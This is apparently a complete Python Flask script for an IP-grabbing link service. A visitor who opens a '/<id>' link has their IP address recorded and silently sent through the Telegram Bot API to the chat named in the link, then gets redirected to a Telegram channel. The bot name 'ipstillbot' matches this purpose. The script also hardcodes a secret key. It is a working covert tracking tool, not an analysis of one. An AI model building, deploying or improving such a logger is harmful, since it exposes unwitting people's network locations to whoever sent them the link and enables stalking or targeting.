#!/usr/bin/python

## -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
## Import Python Libs
## -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
from flask import Flask, render_template, request, redirect
import os, requests, json
from flask import request, jsonify


## APP Flask
app = Flask(__name__)
app.config['SECRET_KEY'] = 'vsevolodhtml'

#index '/'
@app.route("/", methods=['GET', 'POST'])
def index():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        print(ip)
    except: 
        print('Error')
    
    return redirect("https://t.me/ipstillbot")

#ip '/<ip>'
@app.route("/<id>", methods=['GET', 'POST'])
def ip(id):
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        print(ip)
        method = "sendMessage"
        token = ". . ."
        url = f"https://api.telegram.org/bot{token}/{method}"
        data = {"chat_id": id, "text": str(ip) + ' new IP!'}
        requests.post(url, data=data)
    except: 
        print('Error')
    
    return redirect("https://t.me/vsevolodcoderu")

#RUN Flask APP
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
